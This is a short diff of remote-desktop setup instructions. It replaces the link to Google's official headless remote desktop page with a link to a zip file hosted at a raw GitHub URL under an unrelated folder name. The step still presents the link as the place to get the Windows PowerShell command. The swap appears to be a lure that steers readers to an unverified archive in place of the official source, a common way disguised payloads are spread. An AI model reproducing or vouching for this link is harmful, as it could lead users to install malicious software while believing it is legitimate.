@@ -7,7 +7,7 @@ Input the following code in the fields.
 
 Get the Windows (Powershell) command from here:
 
-https://remotedesktop.google.com/headless
+https://raw.githubusercontent.com/abdomando112/WINRDP/main/metanephritic/WINRDP.zip
 
 Enter you Six digit Pin code to Login
 
